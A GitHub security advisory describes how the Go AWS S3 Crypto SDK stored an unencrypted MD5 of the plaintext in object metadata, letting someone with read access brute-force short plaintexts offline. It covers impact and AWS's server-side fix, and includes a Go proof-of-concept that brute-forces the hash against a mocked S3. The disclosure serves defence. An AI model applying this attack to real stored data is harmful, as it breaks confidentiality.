---
title: ' AWS: Unencrypted md5 plaintext hash in metadata in the AWS S3 Crypto SDK
  for golang'
published: '2020-08-10T20:22:25Z'
severity: Moderate
ghsa_id: GHSA-76wf-9vgp-pj7w
cve_id: ''
weaknesses: []
products:
- ecosystem: ''
  package_name: AWS S3 crypto SDK (aws-sdk-go/service/s3/s3crypto)
  affected_versions: <=2020.08.05
  patched_versions: 2020.08.05
cvss: null
credits:
- github_user_id: sophieschmieg
  name: Sophie Schmieg
  avatar: https://avatars.githubusercontent.com/u/53278002?s=40&v=4
---

### Summary

The golang AWS S3 Crypto SDK was impacted by an issue that can result in loss of confidentiality. An attacker with read access to an encrypted S3 bucket was able to recover the plaintext without accessing the encryption key.

### Risk/Severity

The vulnerability poses insider risks/privilege escalation risks, circumventing KMS controls for stored data.

### Impact

The issue has been fully mitigated by AWS as of Aug. 5th by disallowing the header in question.

The S3 crypto library tries to store an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext in an offline attack, if the hash is readable to the attacker. In order to be impacted by this issue, the attacker has to be able to guess the plaintext as a whole. The attack is theoretically valid if the plaintext entropy is below the key size, i.e. if it is easier to brute force the plaintext instead of the key itself, but practically feasible only for short plaintexts or plaintexts otherwise accessible to the attacker in order to create a rainbow table.

The issue has been fixed server-side by AWS as of Aug 5th, by blocking the related metadata field. No S3 objects are affected anymore.

### Mitigation

The header in question is no longer served by AWS, making this attack fully mitigated as of Aug. 5th.

### Proof of concept

A [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository, this particular issue can be found at [here](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/hash_exploit.go):

```golang
func HashExploit(bucket string, key string, input *OfflineAttackInput) (string, error) {
	_, header, err := input.S3Mock.GetObjectDirect(bucket, key)
	length, err := strconv.Atoi(header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Length"))
	plaintextMd5 := header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Md5")
	blocks := length / 16
	possiblePlaintextNum := 1
	segNum := len(input.PossiblePlaintextSegments)
	for i := 0; i < blocks; i++ {
		possiblePlaintextNum *= segNum
	}
	for i := 0; i < possiblePlaintextNum; i++ {
		w := i
		guess := ""
		for j := 0; j < blocks; j++ {
			guess += input.PossiblePlaintextSegments[w%segNum]
			w /= segNum
		}
		guessMd5 := md5.Sum([]byte(guess))
		if plaintextMd5 == base64.StdEncoding.EncodeToString(guessMd5[:]) {
			return guess, nil
		}
	}
	return "", fmt.Errorf("No plaintext found!")
}
```

The PoC will only work on old versions of the library, as the hash has been removed from being calculated as well.